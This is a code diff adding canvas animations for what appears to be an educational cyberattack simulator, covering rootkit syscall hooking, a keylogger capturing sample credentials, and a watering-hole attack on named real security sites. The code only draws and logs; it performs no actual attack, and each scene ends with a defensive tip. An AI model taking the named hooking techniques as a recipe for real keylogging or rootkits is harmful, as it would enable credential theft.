+        const bW=Math.min(580,w-20), bX=(w-bW)/2;
+
+        // Syscall hook table
+        ctx.fillStyle='#525c70'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+        ctx.fillText('SYSTEM SERVICE DESCRIPTOR TABLE (SSDT):',bX+6,42);
+
+        syscalls.forEach((sc,i)=>{
+            const sy=56+i*28; if(sy>h-100)return;
+            const isHooked=frame>30+i*22;
+            if(isHooked&&!hookedSyscalls.includes(sc)){hookedSyscalls.push(sc);syscallsHooked++;}
+
+            ctx.fillStyle=isHooked?'rgba(255,59,59,0.12)':'rgba(255,255,255,0.02)';
+            ctx.strokeStyle=isHooked?'rgba(255,59,59,0.35)':'rgba(255,255,255,0.05)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,sy,bW,22,3); ctx.fill(); ctx.stroke();
+
+            ctx.fillStyle=isHooked?'#ff3b3b':'#8892a8'; ctx.font='9px JetBrains Mono,monospace'; ctx.textAlign='left';
+            ctx.fillText(sc,bX+8,sy+14);
+            if(isHooked){
+                ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='right';
+                ctx.fillText('HOOKED → rootkit_handler',bX+bW-8,sy+14);
+            }
+            ctx.textAlign='left';
+        });
+
+        // Hidden processes
+        if(frame>120){
+            const procY=h-90;
+            ctx.fillStyle='rgba(255,59,59,0.05)'; ctx.strokeStyle='rgba(255,59,59,0.15)'; ctx.lineWidth=1;
+            ctx.beginPath(); ctx.roundRect(bX,procY,bW,75,4); ctx.fill(); ctx.stroke();
+            ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+            ctx.fillText('HIDDEN PROCESSES (invisible to Task Manager):',bX+8,procY+14);
+            if(frame%50===0&&hiddenProcs.length<processes.length){
+                hiddenProcs.push(processes[hiddenProcs.length]);
+                processesHidden++;
+                filesConcealed+=12;
+                if(hiddenProcs.length===2)activateStep(3);
+                if(hiddenProcs.length===processes.length)activateStep(4);
+            }
+            hiddenProcs.forEach((p,i)=>{
+                ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
+                ctx.fillText(`PID ${3000+i*100}  ${p}  [HIDDEN by rootkit]`,bX+8,procY+30+i*14);
+            });
+        }
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=syscallsHooked;
+            if(e1)e1.textContent=processesHidden;
+            if(e2)e2.textContent=filesConcealed;
+            if(e3)e3.textContent=frame > 300 ? '<0.1%' : '<1%';
+            setProgress(Math.min(100,(frame/360)*100));
+        }
+        if(frame>=360){setProgress(100);termLog('> Simulation done. Secure Boot + TPM essential!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 24. KEYLOGGER ─────────────────────────────────────────────────────── */
+window.simulateKeylogger = function() {
+    termLog('> Keylogger injected via malware dropper...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, keysCaptured=0, credentialsFound=0, sessionsLogged=0;
+    const keySequences=[
+        {window:'Chrome — Gmail',keys:'myemail@corp.com [TAB] MyPassword123! [ENTER]',color:'#ff3b3b',cred:true},
+        {window:'SSH Terminal',keys:'ssh root@server [ENTER] toor123 [ENTER]',color:'#ff3b3b',cred:true},
+        {window:'Word Document',keys:'Quarterly report revenue increased by 23%...',color:'#8892a8',cred:false},
+        {window:'Banking Site',keys:'accountno: 4532xxxx [TAB] PIN: 8821 [ENTER]',color:'#ff3b3b',cred:true},
+        {window:'Slack',keys:'Hey can you send the admin creds? Sure: admin/P@ssw0rd',color:'#ffaa00',cred:true},
+    ];
+    let revealedSeqs=[];
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> SetWindowsHookEx(WH_KEYBOARD_LL) — hook installed!','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Recording every keystroke with window context...','error');},1400);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        ctx.fillStyle='#ff00aa'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
+        ctx.fillText('KEYLOGGER — KEYSTROKE CAPTURE IN PROGRESS',w/2,22);
+
+        const bW=Math.min(580,w-20), bX=(w-bW)/2;
+
+        // Keyboard visualization
+        const kbY=38;
+        const keys='QWERTYUIOPASDFGHJKLZXCVBNM';
+        const activeKey=keys[Math.floor(frame/4)%keys.length];
+        keys.split('').forEach((key,i)=>{
+            const row=i<10?0:i<19?1:2;
+            const col=i<10?i:i<19?i-10:i-19;
+            const offset=row===1?12:row===2?28:0;
+            const kx=bX+offset+col*28, ky=kbY+row*28;
+            const isActive=key===activeKey;
+            ctx.fillStyle=isActive?'rgba(255,0,170,0.6)':'rgba(255,255,255,0.03)';
+            ctx.strokeStyle=isActive?'#ff00aa':'rgba(255,255,255,0.08)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(kx,ky,24,22,3); ctx.fill(); ctx.stroke();
+            ctx.fillStyle=isActive?'#fff':'#525c70'; ctx.font='9px monospace'; ctx.textAlign='center';
+            ctx.fillText(key,kx+12,ky+14);
+            if(isActive)keysCaptured++;
+        });
+
+        // Log display
+        if(frame%55===0&&revealedSeqs.length<keySequences.length){
+            revealedSeqs.push(keySequences[revealedSeqs.length]);
+            sessionsLogged++;
+            if(revealedSeqs[revealedSeqs.length-1].cred){credentialsFound++;termLog(`> CREDENTIAL: ${keySequences[revealedSeqs.length-1].window}`,'error');}
+            if(revealedSeqs.length===2)activateStep(3);
+            if(revealedSeqs.length===4)activateStep(4);
+        }
+
+        const logY=kbY+90;
+        ctx.fillStyle='rgba(255,0,170,0.05)'; ctx.strokeStyle='rgba(255,0,170,0.15)'; ctx.lineWidth=1;
+        ctx.beginPath(); ctx.roundRect(bX,logY,bW,h-logY-15,6); ctx.fill(); ctx.stroke();
+        ctx.fillStyle='#ff00aa'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
+        ctx.fillText('KEYSTROKE LOG (transmitted to attacker):',bX+8,logY+14);
+
+        revealedSeqs.forEach((seq,i)=>{
+            const sy=logY+30+i*48; if(sy>h-20)return;
+            ctx.fillStyle=seq.cred?'rgba(255,59,59,0.1)':'rgba(255,255,255,0.02)';
+            ctx.strokeStyle=seq.cred?'rgba(255,59,59,0.3)':'rgba(255,255,255,0.05)';
+            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX+6,sy,bW-12,40,4); ctx.fill(); ctx.stroke();
+            ctx.fillStyle=seq.color; ctx.font='bold 8px monospace'; ctx.textAlign='left';
+            ctx.fillText(`[Window: ${seq.window}]`,bX+12,sy+12);
+            ctx.fillStyle='#e8ecf4'; ctx.font='9px monospace';
+            ctx.fillText(seq.keys.length>70?seq.keys.slice(0,70)+'...':seq.keys,bX+12,sy+28);
+        });
+
+        if(frame%15===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=keysCaptured.toLocaleString();
+            if(e1)e1.textContent=credentialsFound;
+            if(e2)e2.textContent=`${(keysCaptured*0.02).toFixed(2)} KB`;
+            if(e3)e3.textContent=sessionsLogged;
+            setProgress(Math.min(100,(frame/360)*100));
+        }
+        if(frame>=360){setProgress(100);termLog('> Simulation done. Use MFA + virtual keyboard!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
+
+/* ─── 25. WATERING HOLE ─────────────────────────────────────────────────── */
+window.simulateWateringHole = function() {
+    termLog('> APT actor profiling target organization...', 'warning');
+    const { canvas, ctx, w, h } = getCanvas();
+    activateStep(0);
+
+    let frame=0, sitesCompromised=0, visitorsExposed=0, targetsInfected=0;
+    const targetSites=[
+        {name:'ISACA Forum',url:'isaca.org/forum',victims:12,color:'#8b5cf6'},
+        {name:'ICS-CERT Advisory',url:'ics-cert.cisa.gov',victims:8,color:'#8b5cf6'},
+        {name:'DEFCON Talk Archive',url:'defcon.org/talks',victims:5,color:'#8b5cf6'},
+    ];
+    let compromised=[];
+    const flowParticles=[];
+
+    const org={x:w/2,y:h*0.7,label:'TARGET ORG'};
+    const attacker={x:w*0.5,y:h*0.05,label:'APT ACTOR'};
+
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Watering hole planted on isaca.org/forum!','error');},700);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Target employee visiting poisoned site...','warning');},1500);
+    simTimeout(()=>{if(!state.simRunning)return;activateStep(3);termLog('> Browser exploit triggered — malware delivered!','error');},2400);
+
+    function draw(){
+        if(!state.simRunning)return;
+        frame++;
+        ctx.clearRect(0,0,w,h);
+        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
+
+        // Attacker node
+        ctx.shadowBlur=15; ctx.shadowColor='#ff3b3b';
+        ctx.beginPath(); ctx.arc(attacker.x,attacker.y,18,0,Math.PI*2);
+        ctx.fillStyle='rgba(255,59,59,0.15)'; ctx.fill();
+        ctx.strokeStyle='#ff3b3b'; ctx.lineWidth=2; ctx.stroke(); ctx.shadowBlur=0;
+        ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+        ctx.fillText(attacker.label,attacker.x,attacker.y+20);
+
+        // Target org
+        ctx.beginPath(); ctx.arc(org.x,org.y,22,0,Math.PI*2);
+        ctx.fillStyle='rgba(59,130,246,0.12)'; ctx.fill();
+        ctx.strokeStyle='#3b82f6'; ctx.lineWidth=2; ctx.stroke();
+        ctx.fillStyle='#3b82f6'; ctx.font='bold 9px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+        ctx.fillText(org.label,org.x,org.y+24);
+
+        // Watering hole sites
+        if(frame%80===0&&compromised.length<targetSites.length){
+            compromised.push(targetSites[compromised.length]);
+            sitesCompromised++;
+            termLog(`> ${targetSites[compromised.length-1].name} — COMPROMISED!`,'error');
+        }
+
+        const positions=[
+            {x:w*0.2,y:h*0.38},{x:w*0.5,y:h*0.32},{x:w*0.8,y:h*0.38}
+        ];
+
+        targetSites.forEach((site,i)=>{
+            const pos=positions[i];
+            const isComp=compromised.includes(site);
+            ctx.shadowBlur=isComp?12:0; ctx.shadowColor='#8b5cf6';
+            ctx.beginPath(); ctx.arc(pos.x,pos.y,20,0,Math.PI*2);
+            ctx.fillStyle=isComp?'rgba(139,92,246,0.2)':'rgba(255,255,255,0.03)'; ctx.fill();
+            ctx.strokeStyle=isComp?'#8b5cf6':'rgba(255,255,255,0.1)'; ctx.lineWidth=isComp?2:1; ctx.stroke();
+            ctx.shadowBlur=0;
+            ctx.fillStyle=isComp?'#8b5cf6':'#525c70'; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
+            ctx.fillText(site.name,pos.x,pos.y+22); ctx.fillText(site.url,pos.x,pos.y+33);
+            if(isComp)ctx.fillText('POISONED!',pos.x,pos.y+44);
+
+            // Line from attacker to site
+            if(isComp){
+                ctx.beginPath(); ctx.setLineDash([4,4]); ctx.moveTo(attacker.x,attacker.y+18); ctx.lineTo(pos.x,pos.y-20);
+                ctx.strokeStyle='rgba(255,59,59,0.3)'; ctx.lineWidth=1; ctx.stroke(); ctx.setLineDash([]);
+                // Line from site to org
+                ctx.beginPath(); ctx.moveTo(pos.x,pos.y+20); ctx.lineTo(org.x,org.y-22);
+                ctx.strokeStyle='rgba(139,92,246,0.3)'; ctx.lineWidth=1; ctx.stroke();
+            }
+        });
+
+        // Victim particles
+        if(frame>100&&frame%30===0&&sitesCompromised>0){
+            const pos=positions[rndInt(0,Math.min(sitesCompromised,3))];
+            flowParticles.push({x:pos.x,y:pos.y+20,tx:org.x,ty:org.y-22,p:0});
+            visitorsExposed++;
+        }
+
+        flowParticles.forEach(fp=>{
+            fp.p+=0.02;
+            const px=fp.x+(fp.tx-fp.x)*fp.p, py=fp.y+(fp.ty-fp.y)*fp.p;
+            ctx.beginPath(); ctx.arc(px,py,4,0,Math.PI*2);
+            ctx.fillStyle=`rgba(139,92,246,${1-fp.p*0.5})`; ctx.fill();
+            if(fp.p>=1&&!fp.infected){
+                fp.infected=true; targetsInfected++;
+                termLog(`> Employee infected via ${targetSites[rndInt(0,sitesCompromised)].name}!`,'error');
+                if(targetsInfected>=2)activateStep(4);
+            }
+        });
+        flowParticles.splice(0,flowParticles.filter(p=>p.p>=2).length);
+
+        if(frame%20===0){
+            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
+            if(e0)e0.textContent=sitesCompromised;
+            if(e1)e1.textContent=visitorsExposed;
+            if(e2)e2.textContent=targetsInfected;
+            if(e3)e3.textContent=`${Math.round(frame/3)} days`;
+            setProgress(Math.min(100,(frame/380)*100));
+        }
+        if(frame>=380){setProgress(100);termLog('> Simulation done. Use browser isolation!','success');stopSimulation();return;}
+        state.simFrame=requestAnimationFrame(draw);
+    }
+    state.simFrame=requestAnimationFrame(draw);
+};
